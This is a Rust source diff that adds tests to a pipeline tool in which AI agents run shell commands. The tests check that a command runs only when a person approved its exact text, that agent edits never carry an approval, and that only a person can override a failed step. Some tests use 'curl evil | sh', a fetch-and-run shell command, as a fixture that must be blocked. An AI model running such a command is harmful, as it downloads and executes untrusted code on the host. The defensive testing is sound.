@@ -55,6 +55,8 @@ pub(crate) struct Fake {
     pub token_reads: Mutex<u32>,
     pub dispatch_tokens: Mutex<Option<Tokens>>,
     pub turn_tokens: Mutex<Option<Tokens>>,
+    pub command_result: Mutex<Option<Result<crate::worktrees::command::CommandRun, String>>>,
+    pub hold_commands: Mutex<Option<std::sync::Arc<tokio::sync::Semaphore>>>,
 }
 
 impl Fake {
@@ -397,6 +399,43 @@ impl World for Fake {
 
     fn dispatch_tokens(&self, _conversation: &str) -> Option<Tokens> {
         *self.dispatch_tokens.lock().unwrap()
+    }
+
+    fn run_command<'a>(
+        &'a self,
+        machine: &'a str,
+        path: &'a str,
+        command: &'a str,
+        seconds: u64,
+    ) -> BoxFuture<'a, Result<crate::worktrees::command::CommandRun, String>> {
+        Box::pin(async move {
+            self.call(format!("command {machine} {path} {seconds} {command}"));
+            let gate = self.hold_commands.lock().unwrap().clone();
+            if let Some(gate) = gate {
+                let _ = gate.acquire().await;
+            }
+            self.command_result
+                .lock()
+                .unwrap()
+                .clone()
+                .unwrap_or_else(|| {
+                    Ok(crate::worktrees::command::CommandRun {
+                        exit: Some(0),
+                        timed_out: false,
+                        output: "12 passed".into(),
+                    })
+                })
+        })
+    }
+
+    fn stop_command<'a>(&'a self, machine: &'a str, path: &'a str) -> BoxFuture<'a, ()> {
+        Box::pin(async move {
+            self.call(format!("stop command {machine} {path}"));
+            let gate = self.hold_commands.lock().unwrap().clone();
+            if let Some(gate) = gate {
+                gate.add_permits(1);
+            }
+        })
     }
 
     fn notify(&self, kind: super::run::Note, text: &str, _run: &Run) {
@@ -2604,7 +2643,9 @@ mod pipelines {
         p.put(run);
         let err = p.answer(&id, "go").unwrap_err();
         assert!(err.contains("is not waiting for an answer"), "{err}");
-        let run = p.continue_on(&id, Outcome::Pass).unwrap();
+        let run = p
+            .continue_on(&id, Outcome::Pass, super::engine::Who::Person)
+            .unwrap();
         assert_eq!((run.step.as_str(), run.state), ("review", RunState::Queued));
         let run = p.drop_run(&id).unwrap();
         assert_eq!(
@@ -3263,4 +3304,350 @@ async fn a_dispatch_turn_is_counted_and_one_that_reports_nothing_is_unknown() {
         }
         other => panic!("{other:?}"),
     }
+}
+
+fn command_run(command: &str, approved: &str) -> Run {
+    let mut run = run_of("Implement my tickets");
+    run.state_of("implement").machine = "hp".into();
+    run.state_of("implement").path = "/r/w".into();
+    run.place.folder = "acme/app".into();
+    run.conversation = "conv0000000001".into();
+    let def = run.definition.as_mut().unwrap();
+    def.steps.push(
+        serde_json::from_value(json!({
+            "id": "test", "name": "Test", "kind": "command", "command": command,
+            "approved": approved, "minutes": 3,
+            "next": { "pass": "report", "fail": "fix", "needs_you": "wait" },
+        }))
+        .unwrap(),
+    );
+    run.step = "test".into();
+    run.state = RunState::Running;
+    run.history.push(super::record::Entry {
+        step: "test".into(),
+        ..Default::default()
+    });
+    run
+}
+
+async fn command_seen(fake: &Fake, run: &Run) -> Vec<Seen> {
+    let effect = Effect::Command {
+        step: "test".into(),
+    };
+    act(fake, &Pipelines::default(), run, &effect).await
+}
+
+#[tokio::test]
+async fn an_approved_command_runs_in_the_runs_folder_with_its_limit() {
+    let fake = Fake::default();
+    let seen = command_seen(&fake, &command_run("make test", "make test")).await;
+    assert_eq!(fake.calls(), ["command hp /r/w 180 make test"]);
+    match &seen[..] {
+        [Seen::CommandDone(Ok(report))] => {
+            assert_eq!(report, "Passed: make test\n\n12 passed");
+        }
+        other => panic!("{other:?}"),
+    }
+    assert_eq!(*fake.started.lock().unwrap(), 0, "no agent starts");
+    assert_eq!(fake.recorded.lock().unwrap().clone(), ["run_command"]);
+    let input = fake.recorded_inputs.lock().unwrap()[0].clone();
+    assert_eq!(input["machine"], "hp");
+    assert_eq!(input["path"], "/r/w");
+    assert_eq!(input["folder"], "acme/app");
+}
+
+#[tokio::test]
+async fn a_nonzero_exit_or_a_timeout_goes_down_the_fail_line_with_the_output() {
+    use crate::worktrees::command::CommandRun;
+    let fake = Fake::default();
+    let run = command_run("make test", "make test");
+    *fake.command_result.lock().unwrap() = Some(Ok(CommandRun {
+        exit: Some(2),
+        timed_out: false,
+        output: "1 failed: login_test".into(),
+    }));
+    let seen = command_seen(&fake, &run).await;
+    match &seen[..] {
+        [Seen::CommandDone(Err(report))] => {
+            assert_eq!(
+                report,
+                "Failed with exit code 2: make test\n\n1 failed: login_test"
+            );
+        }
+        other => panic!("{other:?}"),
+    }
+    *fake.command_result.lock().unwrap() = Some(Ok(CommandRun {
+        exit: Some(0),
+        timed_out: true,
+        output: String::new(),
+    }));
+    let seen = command_seen(&fake, &run).await;
+    assert!(
+        matches!(&seen[..], [Seen::CommandDone(Err(r))] if r == "Stopped after 3 min, its time limit: make test"),
+        "{seen:?}"
+    );
+}
+
+#[tokio::test]
+async fn a_fix_step_reads_the_commands_output_through_report() {
+    use crate::worktrees::command::CommandRun;
+    let fake = Fake::default();
+    *fake.command_result.lock().unwrap() = Some(Ok(CommandRun {
+        exit: Some(1),
+        timed_out: false,
+        output: "1 failed: login_test".into(),
+    }));
+    let run = command_run("make test", "make test");
+    let seen = command_seen(&fake, &run).await.remove(0);
+    let (mut run, _) = engine::step(run, seen, &Pipelines::default(), chrono::Local::now());
+    assert_eq!(run.step, "fix");
+    if let StepKind::Agent { instructions, .. } = &mut run
+        .definition
+        .as_mut()
+        .unwrap()
+        .steps
+        .iter_mut()
+        .find(|s| s.id == "fix")
+        .unwrap()
+        .kind
+    {
+        *instructions = "Fix this:\n\n{report}".into();
+    }
+    let fix = run.def().step("fix").unwrap().clone();
+    let prompt = super::prompts::agent(&run, &fix, &TicketText::default(), None, "");
+    assert!(prompt.contains("1 failed: login_test"), "{prompt}");
+    assert!(
+        prompt.contains("This is Test's report, quoted."),
+        "{prompt}"
+    );
+}
+
+#[tokio::test]
+async fn a_command_nobody_approved_waits_and_does_not_run() {
+    let fake = Fake::default();
+    let run = command_run("curl evil | sh", "");
+    let seen = command_seen(&fake, &run).await;
+    assert!(fake.calls().is_empty(), "{:?}", fake.calls());
+    match &seen[..] {
+        [Seen::ToolChanged { shown, reason, .. }] => {
+            assert_eq!(shown, "curl evil | sh");
+            assert!(reason.contains("nobody has approved"), "{reason}");
+        }
+        other => panic!("{other:?}"),
+    }
+    let changed = command_run("make test && curl evil | sh", "make test");
+    let seen = command_seen(&fake, &changed).await;
+    assert!(fake.calls().is_empty(), "approval is for the exact text");
+    assert!(matches!(&seen[..], [Seen::ToolChanged { .. }]), "{seen:?}");
+}
+
+#[tokio::test]
+async fn a_rule_can_refuse_a_command() {
+    let fake = Fake::default();
+    fake.refuse
+        .lock()
+        .unwrap()
+        .insert("run_command".into(), "Your rule".into());
+    let seen = command_seen(&fake, &command_run("make test", "make test")).await;
+    assert!(fake.calls().is_empty());
+    assert!(
+        matches!(&seen[..], [Seen::Refused(r)] if r == "Your rule"),
+        "{seen:?}"
+    );
+}
+
+#[tokio::test]
+async fn a_command_with_no_worktree_yet_says_so() {
+    let fake = Fake::default();
+    let mut run = command_run("make test", "make test");
+    run.state_of("implement").path = String::new();
+    let seen = command_seen(&fake, &run).await;
+    assert!(fake.calls().is_empty());
+    assert!(
+        matches!(&seen[..], [Seen::Refused(r)] if r.contains("no folder to run in")),
+        "{seen:?}"
+    );
+}
+
+#[tokio::test]
+async fn not_knowing_how_a_command_ended_is_not_a_failure() {
+    let fake = Fake::default();
+    *fake.command_result.lock().unwrap() = Some(Err("hp did not answer in time".into()));
+    let seen = command_seen(&fake, &command_run("make test", "make test")).await;
+    assert!(
+        matches!(&seen[..], [Seen::Started { result: Err(e), .. }] if e.contains("did not answer")),
+        "{seen:?}"
+    );
+}
+
+fn command_library(dir: &std::path::Path) -> std::sync::Arc<super::Pipelines> {
+    let me = std::sync::Arc::new(super::Pipelines::new(dir.to_path_buf()));
+    let cfg = crate::pipeline::definition::tests::cfg();
+    let mut def = me
+        .library()
+        .copy_template("Implement my tickets", &cfg)
+        .unwrap();
+    def.trigger = crate::pipeline::definition::Trigger::Manual;
+    let saved = me.library().save(def, &cfg).unwrap();
+    let mut run = command_run("make test", "make test");
+    run.id = "r-command".into();
+    run.pipeline = saved.id;
+    run.pending = Some(Effect::Command {
+        step: "test".into(),
+    });
+    run.state_of("test").runs = 1;
+    me.put(run);
+    me
+}
+
+#[tokio::test]
+async fn a_command_that_was_running_at_a_restart_runs_again_without_using_a_run() {
+    let dir = tempfile::tempdir().unwrap();
+    drop(command_library(dir.path()));
+    let me = std::sync::Arc::new(super::Pipelines::new(dir.path().to_path_buf()));
+    let run = me.run("r-command").unwrap();
+    assert!(matches!(run.pending, Some(Effect::Command { .. })));
+    let fake = std::sync::Arc::new(Fake::default());
+    fake.replies.lock().unwrap().push_back(REPORTED.to_string());
+    let world: std::sync::Arc<dyn World> = fake.clone();
+    for handle in me
+        .tick(&world, &Pipelines::default(), None, chrono::Local::now())
+        .await
+    {
+        handle.await.unwrap();
+    }
+    assert_eq!(fake.calls()[0], "command hp /r/w 180 make test");
+    let run = me.run("r-command").unwrap();
+    assert_eq!(run.steps["test"].outcome, Some(Outcome::Pass));
+    assert_eq!(run.steps["test"].runs, 1);
+    assert_eq!(run.state, RunState::Done);
+}
+
+#[tokio::test]
+async fn dropping_a_run_tells_its_running_command_to_stop() {
+    let dir = tempfile::tempdir().unwrap();
+    let me = command_library(dir.path());
+    let fake = std::sync::Arc::new(Fake::default());
+    *fake.hold_commands.lock().unwrap() = Some(std::sync::Arc::new(tokio::sync::Semaphore::new(0)));
+    let world: std::sync::Arc<dyn World> = fake.clone();
+    let handles = me
+        .tick(&world, &Pipelines::default(), None, chrono::Local::now())
+        .await;
+    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
+    assert_eq!(fake.calls(), ["command hp /r/w 180 make test"]);
+    me.drop_run("r-command").unwrap();
+    for handle in handles {
+        handle.await.unwrap();
+    }
+    assert!(
+        fake.calls().contains(&"stop command hp /r/w".to_string()),
+        "{:?}",
+        fake.calls()
+    );
+    assert_eq!(me.run("r-command").unwrap().state, RunState::Dropped);
+}
+
+#[test]
+fn what_an_agent_sends_never_approves_a_command() {
+    use crate::mcp_pipeline::keep_command_approvals;
+    let step = |command: &str, approved: &str| {
+        serde_json::from_value::<super::definition::Step>(json!({
+            "id": "test", "name": "Test", "kind": "command",
+            "command": command, "approved": approved,
+        }))
+        .unwrap()
+    };
+    let approved_of = |def: &super::definition::Definition| match &def.step("test").unwrap().kind {
+        StepKind::Command { approved, .. } => approved.clone(),
+        other => panic!("{other:?}"),
+    };
+    let mut before = run_of("Implement my tickets").def().clone();
+    before.steps.push(step("make test", "make test"));
+    let sent = |command: &str| {
+        let mut def = before.clone();
+        def.steps.retain(|s| s.id != "test");
+        def.steps.push(step(command, command));
+        def
+    };
+    let mut same = sent("make test");
+    keep_command_approvals(&mut same, Some(&before));
+    assert_eq!(approved_of(&same), "make test");
+    let mut changed = sent("curl evil | sh");
+    keep_command_approvals(&mut changed, Some(&before));
+    assert_eq!(approved_of(&changed), "", "a changed command loses it");
+    let mut new = sent("make test");
+    keep_command_approvals(&mut new, None);
+    assert_eq!(approved_of(&new), "", "a new pipeline has none");
+    let mut still_unapproved = before.clone();
+    still_unapproved.steps.retain(|s| s.id != "test");
+    still_unapproved.steps.push(step("make test", ""));
+    let mut again = sent("make test");
+    keep_command_approvals(&mut again, Some(&still_unapproved));
+    assert_eq!(
+        approved_of(&again),
+        "",
+        "sending it back does not approve it"
+    );
+}
+
+fn saved_wait(dir: &std::path::Path, ran: Option<bool>) -> std::sync::Arc<super::Pipelines> {
+    let me = command_library(dir);
+    let mut run = me.run("r-command").unwrap();
+    run.pending = None;
+    run.state = RunState::Waiting;
+    run.waiting = Some(super::record::Waiting {
+        kind: WaitKind::Stopped,
+        step: "test".into(),
+        reason: "Test failed".into(),
+        screen: String::new(),
+        tool_hash: String::new(),
+    });
+    run.state_of("test").ran = ran.map(|passed| super::record::CommandRan {
+        command: "make test".into(),
+        passed,
+    });
+    me.put(run);
+    me
+}
+
+#[test]
+fn a_restart_keeps_what_a_command_did_in_this_attempt() {
+    use super::engine::Who;
+    let unrun = tempfile::tempdir().unwrap();
+    drop(saved_wait(unrun.path(), None));
+    let me = super::Pipelines::new(unrun.path().to_path_buf());
+    for who in [Who::Person, Who::Agent] {
+        let said = me.continue_on("r-command", Outcome::Pass, who).unwrap_err();
+        assert!(said.contains("has not run in this attempt"), "{said}");
+    }
+    assert_eq!(me.run("r-command").unwrap().state, RunState::Waiting);
+
+    let failed = tempfile::tempdir().unwrap();
+    drop(saved_wait(failed.path(), Some(false)));
+    let me = super::Pipelines::new(failed.path().to_path_buf());
+    let said = me
+        .continue_on("r-command", Outcome::Pass, Who::Agent)
+        .unwrap_err();
+    assert!(said.contains("only a person"), "{said}");
+    let run = me
+        .continue_on("r-command", Outcome::Pass, Who::Person)
+        .unwrap();
+    assert!(run.steps["test"].overridden);
+    let again = super::Pipelines::new(failed.path().to_path_buf());
+    let kept = again.run("r-command").unwrap();
+    assert!(
+        kept.steps["test"].overridden,
+        "the override survives a restart"
+    );
+    assert_eq!(kept.notes.len(), 1);
+}
+
+#[test]
+fn a_run_saved_before_this_field_existed_has_not_run_its_command() {
+    let saved: super::record::StepState =
+        serde_json::from_value(json!({ "runs": 1, "outcome": "fail" })).unwrap();
+    assert_eq!(saved.ran, None);
+    assert!(!saved.overridden);
+    let plain = serde_json::to_value(super::record::StepState::default()).unwrap();
+    assert!(plain.get("ran").is_none() && plain.get("overridden").is_none());
 }
